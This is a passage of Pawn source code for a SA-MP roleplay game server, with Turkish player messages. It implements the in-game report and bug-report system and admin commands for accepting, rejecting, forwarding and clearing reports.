			PlayerInfo[playerid][pAccent] = 20;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Galler aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
 	case 21:
		{
			PlayerInfo[playerid][pAccent] = 21;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Fransýz aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
 	case 22:
		{
			PlayerInfo[playerid][pAccent] = 22;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Alman aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
 	case 23:
		{
			PlayerInfo[playerid][pAccent] = 23;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Hollandallý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
 	case 24:
		{
			PlayerInfo[playerid][pAccent] = 24;
			SendClientMessage(playerid, COLOR_WHITE, "Þu an Güney Afrikalý aksaný ile konuþuyorsun, /aksan ile deðiþtirebilirsin.");
		}
 	case 25:
		{
			PlayerInfo[playerid][pAccent] = 25;
			SendClientMessage(playerid, COLOR_WHITE, "Herhangi bir aksanýn yok, /aksan ile deðiþtirebilirsin.");
		}
	}
	return 1;
}

CMD:cevap(playerid, params[])
{
	new string[128];
	new reportid = INVALID_REPORT_ID;
	for(new i = 0; i < MAX_REPORTS; i++)
	{
		if(Reports[i][ReportFrom] == playerid && Reports[i][CheckingReport] != 999)
		{
			reportid = i;
		}
	}
	if(reportid == INVALID_REPORT_ID)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Þu an incenen hiç raporun yok.");
		return 1;
	}
	if(IsPlayerConnected(Reports[reportid][CheckingReport]))
	{
		format(string, sizeof(string), "%s(ID: %d) cevaplar: %s", GetPlayerNameEx(playerid), playerid, params);
		SendClientMessage(Reports[reportid][CheckingReport], COLOR_YELLOW, string);

		format(string, sizeof(string), "Cevap %s kiþisine gönderildi: %s", GetPlayerNameEx(Reports[reportid][CheckingReport]), params);
		SendClientMessage(playerid,  COLOR_YELLOW, string);
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Oyuncu baðlý deðil.");
	return 1;
}

CMD:raportipleri(playerid, params[])
{
	ShowPlayerDialogEx(playerid,7955,DIALOG_STYLE_MSGBOX,"Rapor Tüyolarý","Rapor atarken tüyolar:\n- Ne gerekiyorsa onu rapor et, kim gerekiyorsa deðil.\n- Belirleyici ol, tam olarak ne istiyorsan onu rapor et.\n- Yanlýþ raporlar yapma.\n- Sadece oyun içi problemleri rapor et.","Kapat", "");
	return 1;
}

CMD:reportbugasfaxs(playerid, params[])
{
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "Bu beta sunucuda deðil!");

	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 6)
		return SendClientMessage(playerid, COLOR_GRAD2, "Iþbaþýndayken rapor gönderemezsin.");

	if(PlayerInfo[playerid][pRMuted] != 0)
		return ShowPlayerDialogEx(playerid,7955,DIALOG_STYLE_MSGBOX,"Rapor Tüyolarý","Rapor atarken tüyolar:\n- Belirleyici ol, sorunu tarif et.\n- Yanlýþ hata raporlarý gönderme.","Kapat", "");

	if(JustReported[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "Baþka bir hata raporu göndermeden önce 10 saniye bekle!");

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /reportbug [text]");

	JustReported[playerid] = 10;
	SendBugReportToQueue(playerid, params);
	SendClientMessage(playerid, COLOR_YELLOW, "Rapor mesajýn geliþtiricilere gönderildi.");
	return 1;
}

CMD:bugsasfafsaasdfasdfdfasdfas(playerid, params[])
{
	if(!IsBETAServer())
	    return SendClientMessage(playerid, COLOR_GREY, "Bu beta sunucuda deðil!");

	if(PlayerInfo[playerid][pAdmin] >= 1) {
		new string[128];
		SendClientMessage(playerid, COLOR_GREEN, "____________________ HATALAR _____________________");
		for(new i = 0; i < MAX_REPORTS; i++)
		{
			if(Reports[i][BeingUsed] == 1 && Reports[i][BugReport] == 1)
			{
				format(string, sizeof(string), "%s(ID: %i) | BID: %i | Rapor: %s", GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, (Reports[i][Report]));
				SendClientMessage(playerid, COLOR_REPORT, string);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "___________________________________________________");
	}
	return 1;
}

CMD:rapor(playerid, params[])
{
	if(AdminDuty[playerid] == 1 && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Iþbaþýndayken rapor gönderemezsin.");
		return 1;
	}
	if(PlayerInfo[playerid][pRMuted] != 0)
	{
		ShowPlayerDialogEx(playerid,7955,DIALOG_STYLE_MSGBOX,"Rapor Tüyolarý","Rapor atarken tüyolar:\n- Ne gerekiyorsa onu rapor et, kim gerekiyorsa deðil.\n- Belirleyici ol, tam olarak ne istiyorsan onu rapor et.\n- Yanlýþ raporlar yapma.\n- Sadece oyun içi problemleri rapor et.","Kapat", "");
		return 1;
	}
	if(JustReported[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Baþka bir rapor göndermeden önce 25 saniye bekle!");
		return 1;
	}

	if(isnull(params)) return SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /rapor [text]");

	JustReported[playerid]=25;
	SendReportToQueue(playerid, params);
	SendClientMessage(playerid, COLOR_YELLOW, "Rapor mesajýn Adminlere gönderildi.");
	return 1;
}

CMD:reports(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128];
		SendClientMessage(playerid, COLOR_GREEN, "____________________ RAPORLAR _____________________");
		for(new i = 0; i < MAX_REPORTS; i++)
		{
			if(Reports[i][BeingUsed] == 1 && Reports[i][BugReport] == 0)
			{
				format(string, sizeof(string), "%s(ID: %i) | RID: %i | Raporlar: %s | Geçerlilik Süresi: %d dakika.", GetPlayerNameEx(Reports[i][ReportFrom]), Reports[i][ReportFrom], i, (Reports[i][Report]), Reports[i][TimeToExpire]);
				SendClientMessage(playerid, COLOR_REPORT, string);
			}
		}
		SendClientMessage(playerid, COLOR_GREEN, "___________________________________________________");
	}
	return 1;
}

CMD:ar(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ar [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "Bu rapor türü sadece geliþtiriciler ve beta test ediciler tarafýndan kabul edilebilir.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0) {
			SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom])) {
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdminKomutu: %s, %s (ID: %i, RID: %i) kiþisinden gelen raporu kabul etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]),Reports[reportid][ReportFrom],reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		AddReportToken(playerid); // Report Tokens
		format(string, sizeof(string), "%s raporunu kabul etti ve inceliyor, /cevap ile raporunu inceleyen Admin'e mesaj gönderebilirsin.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		PlayerInfo[playerid][pAcceptReport]++;
		Reports[reportid][ReplyTimerr] = SetTimerEx("ReplyTimer", 60000, 0, "d", reportid);
		Reports[reportid][CheckingReport] = playerid;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	}
	return 1;
}

CMD:tr(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new
			string[128],
			reportid;

		if(sscanf(params, "d", reportid))
			return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /tr [reportid]");

		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "Bu rapor türü sadece geliþtiriciler ve beta test ediciler tarafýndan kabul edilebilir.");

		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinden gelen raporu çöpe attý.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]));
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s raporunu geçersiz saydý. Raporun incelenmeyecek. /raportipleri komutunu incele", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		PlayerInfo[playerid][pTrashReport]++;
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	}
	return 1;
}

CMD:listpnamechanges(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 2)
	    return SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanma yetkin yok.");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	new
	    iTarget;

	if(sscanf(params, "u", iTarget))
	    return SendClientMessage(playerid, COLOR_GREY, "KULLANIM: /listnchanges [Oyuncu ID/Ýsim]");

	if(iTarget == INVALID_PLAYER_ID)
	    return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

	new
	    szQuery[114];

	SetPVarInt(playerid, "namechanges_target", iTarget);

	format(szQuery, sizeof(szQuery), "SELECT oldname, unixts, newname, approvedbyname FROM namechanges WHERE dbid = %d ORDER BY unixts DESC LIMIT 10", PlayerInfo[iTarget][pID]);
	mysql_query(szQuery, THREAD_LIST_NAMECHANGES, playerid, g_MySQLConnections[0]);
	return 1;
}

CMD:sth(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(isnull(params))
			return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /sth [reportid]");

		new
			iReportID = strval(params);

		if(iReportID < 0 || iReportID > 999)
			return SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!");

		if(Reports[iReportID][BeingUsed] == 0)
			return SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");

		if(!IsPlayerConnected(Reports[iReportID][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[iReportID][ReportFrom] = 999;
			Reports[iReportID][BeingUsed] = 0;
			return 1;
		}

		SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "Bir admin raporunu kýdemli yardýmcýlara sevk etti. /yardimiste ile bunu yapabilirsin.");
		SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "Kýdemli yardýmcýlar ve diðer insanlar bu konuda sana yardýmcý olacaklar.");

		if(gNewbie[Reports[iReportID][ReportFrom]] != 0)
			gNewbie[Reports[iReportID][ReportFrom]] = 0;


	    SetPVarString(Reports[iReportID][ReportFrom], "helpreq", Reports[iReportID][Report]);

	    new
	        szMessage[128];

	    format(szMessage, sizeof(szMessage), "YardýmKomutu: %s (%d) yardým için istek gönderdi; %s", GetPlayerNameEx(Reports[iReportID][ReportFrom]), Reports[iReportID][ReportFrom], Reports[iReportID][Report]);
	    HelperBroadcast(COLOR_LIGHTBLUE, szMessage, 1);

		format(szMessage, sizeof(szMessage), "AdminKomutu: %s, %s kiþisinin raporunu (RID: %d) kýdemli yardýmcýlara sevk etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[iReportID][ReportFrom]), iReportID);
		ABroadCast(COLOR_ORANGE, szMessage, 1);

		Reports[iReportID][ReportFrom] = 999;
		Reports[iReportID][BeingUsed] = 0;
		Reports[iReportID][TimeToExpire] = 0;
		strmid(Reports[iReportID][Report], "Yok", 0, 4, 4);
	}
	return 1;
}

CMD:rtnc(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 2) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		if(PlayerInfo[playerid][pHelper] >= 2) {
		    new
		        iTarget,
				szMessage[128],
				szHelp[128];

	    	if(sscanf(params, "u", iTarget))
	        	return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /rtnc [Oyuncu ID/Ýsim]");

	        if(iTarget == INVALID_PLAYER_ID)
	            return SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");

			if(GetPVarType(iTarget, "helpreq") == 0)
			    return SendClientMessage(playerid, COLOR_GREY, "Belirlenen oyuncu yardým isteðinde bulunmadý.");

			SendClientMessage(iTarget, COLOR_WHITE, "Bir yardýmcý raporunu Newbie Kanalýna sevk etti. Yanýt için /newb.");
			SendClientMessage(iTarget, COLOR_WHITE, "Oyuncular, adminler ve diðer insanlar sorun hakkýnda yardýmcý olacaklar.");

			if(gNewbie[iTarget] != 0)
				gNewbie[iTarget] = 0;

			GetPVarString(playerid, "helpreq", szHelp, sizeof(szHelp));

			format(szMessage, sizeof(szMessage), "** Newbie %s: %s", GetPlayerNameEx(iTarget), szHelp);
			foreach(Player, n) {
				if(gNewbie[n]==0) {
					SendClientMessage(n, COLOR_NEWBIE, szMessage);
				}
			}

			format(szMessage, sizeof(szMessage), "YardýmKomutu: %s, %s kiþisinin isteðini (ID: %d) Newbie Kanalýna sevk etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(iTarget), iTarget);
			HelperBroadcast(COLOR_ORANGE, szMessage, 1);
		} else {
	 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
		        return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");

		    if(isnull(params))
		        return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /rtnc [reportid]");

		    new
		        iReportID = strval(params);

			if(iReportID < 0 || iReportID > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
			if(Reports[iReportID][BeingUsed] == 0)
			{
				SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
				return 1;
			}
			if(!IsPlayerConnected(Reports[iReportID][ReportFrom]))
			{
				SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
				Reports[iReportID][ReportFrom] = 999;
				Reports[iReportID][BeingUsed] = 0;
				return 1;
			}

			SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "Bir admin raporunu Newbie Kanalýna sevk etti. /newb ile yanýt verebilirsin.");
			SendClientMessage(Reports[iReportID][ReportFrom], COLOR_WHITE, "Oyuncular, yardýmcýlar ve diðer insanlar sorunuza yardýmcý olacaklar.");

			if(gNewbie[Reports[iReportID][ReportFrom]] != 0)
				gNewbie[Reports[iReportID][ReportFrom]] = 0;

			new
			    szMessage[128];

			format(szMessage, sizeof(szMessage), "** Newbie %s: %s", GetPlayerNameEx(Reports[iReportID][ReportFrom]), Reports[iReportID][Report]);
			foreach(Player, n) {
				if(gNewbie[n]==0) {
					SendClientMessage(n, COLOR_NEWBIE, szMessage);
				}
			}

			format(szMessage, sizeof(szMessage), "AdminKomutu: %s, %s kiþisinin raporunu (RID: %d) Newbie Kanalýna sevk etti.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[iReportID][ReportFrom]), iReportID);
			ABroadCast(COLOR_ORANGE, szMessage, 1);

			Reports[iReportID][ReportFrom] = 999;
			Reports[iReportID][BeingUsed] = 0;
			Reports[iReportID][TimeToExpire] = 0;
			strmid(Reports[iReportID][Report], "Yok", 0, 4, 4);
		}
	}

	return 1;
}

CMD:nro(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /nro [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "Bu rapor türü sadece geliþtiriciler ve beta test ediciler tarafýndan kabul edilebilir.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinden gelen raporu (RID: %d)temizledi, raporlanan þey kural bozan bir suç deðil.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s raporunu inceledi ve geçersiz saydý. Rapor ettiðin oyuncu hiçbir kuralý bozmuyor.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "Bunun kural bozan bir suç olduðunu düþünüyorsan, bunun bize yeni bir kural olarak foruma kayýt edilmesini teklif edebilirsin.");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	}
	return 1;
}

CMD:post(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /post [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "Bu rapor türü sadece geliþtiriciler ve beta test ediciler tarafýndan kabul edilebilir.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinden gelen raporu(RID: %d) temizledi, çünkü forumda halledilmesi gereken bir konu.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s raporunu inceledi ve forumda halledilmesi gereken bir konu olduðuna karar verdi (örnek: istek veya þikayet.)", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "Yalnýzca oyunda aktifçe çýkan eþyalar için rapor atýn. ("WEBSITE")");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	}
	return 1;
}

CMD:norevive(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /norevive [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "Bu rapor türü sadece geliþtiriciler ve beta test ediciler tarafýndan kabul edilebilir.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin raporunu (RID: %d) temizledi, çünkü diriltme isteði geçersiz bir rapor.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s raporunu inceledi ve diriltilemeyeceðine karar verdi.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "Bir hata veya DM'den dolayý öldüysen (ve bir admin buna tanýk olduysa), o zaman diriltilebilirsin.");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	}
	return 1;
}
CMD:nobaslangic(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /nobaslangic [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "Bu rapor türü sadece geliþtiriciler ve beta test ediciler tarafýndan kabul edilebilir.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinin raporunu (RID: %d) temizledi, çünkü bu sunucuda baþlangýç hediyesi verilmemektedir.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s raporunu inceledi ve baþlangýç hediyesi vermeyeceðine karar verdi.", GetPlayerNameEx(playerid));
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	}
	return 1;
}
CMD:nao(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1)
	{
 		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], reportid;
		if(sscanf(params, "d", reportid)) return SendClientMessage(playerid, COLOR_WHITE,"KULLANIM: /nao [reportid]");
		if(Reports[reportid][BugReport] == 1 && PlayerInfo[playerid][pAdmin] < 6 && IsBETAServer())
			return SendClientMessage(playerid,COLOR_WHITE, "Bu rapor türü sadece geliþtiriciler ve beta test ediciler tarafýndan kabul edilebilir.");
		if(reportid < 0 || reportid > 999) { SendClientMessage(playerid, COLOR_GREY, "Rapor ID'si 0-999 arasýnda olmalý!"); return 1; }
		if(Reports[reportid][BeingUsed] == 0)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor ID'si kullanýlmýyor!");
			return 1;
		}
		if(!IsPlayerConnected(Reports[reportid][ReportFrom]))
		{
			SendClientMessage(playerid, COLOR_GREY, "   Rapor eden oyundan çýktý!");
			Reports[reportid][ReportFrom] = 999;
			Reports[reportid][BeingUsed] = 0;
			return 1;
		}
		format(string, sizeof(string), "AdminKomutu: %s, %s kiþisinden gelen raporu (RID: %d) temizledi, çünkü oyunda þu an yeterli yetkiye sahip admin yok.", GetPlayerNameEx(playerid), GetPlayerNameEx(Reports[reportid][ReportFrom]), reportid);
		ABroadCast(COLOR_ORANGE, string, 1);
		format(string, sizeof(string), "%s raporunuzu inceledi, fakat isteðinizi halledebilecek seviyede yetkili bir online admin yok.", GetPlayerNameEx(playerid));
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, string);
		SendClientMessage(Reports[reportid][ReportFrom], COLOR_WHITE, "Ek yardým için foruma konu açabilirsin ("WEBSITE"). Rahatsýzlýktan dolayý özür dileriz. ");
		Reports[reportid][ReportFrom] = 999;
		Reports[reportid][BeingUsed] = 0;
		Reports[reportid][TimeToExpire] = 0;
		strmid(Reports[reportid][Report], "Yok", 0, 4, 4);
	}
	return 1;
}

CMD:clearallreports(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 5) {
  		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
        new string[128];
        ClearReports();
        SendClientMessage(playerid,COLOR_GRAD1, "Tüm aktif raporlarý temizledin.");
        format(string, sizeof(string), "AdminKomutu: %s bekleyen tüm raporlarý temizledi.", GetPlayerNameEx(playerid));
        ABroadCast(COLOR_LIGHTRED, string, 1);
    }
    else {
        SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanma yetkiniz yok!");
    }
    return 1;
}

CMD:admins(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

        SendClientMessage(playerid, COLOR_CYAN, "Online Adminler:");
        foreach(Player, i)
		{
            if(PlayerInfo[i][pAdmin] >= 1 && PlayerInfo[i][pAdmin] <= PlayerInfo[playerid][pAdmin])
			{
				new string[128], strFromFile[128], sstring[128], rtoken;
	 			new playern[MAX_PLAYER_NAME];
  				new month, day, year;
  		 		GetPlayerName(i, playern, sizeof(playern));
  		 		getdate(year, month, day);

                if(PlayerInfo[playerid][pAdmin] >= 5)
				{
					if(AdminDuty[i] == 1)
					{
                		format(sstring,sizeof(sstring),"admins/rtokens/%s[%d'%d'%d]",playern,month,day,year);
                		if(fexist(sstring))
						{
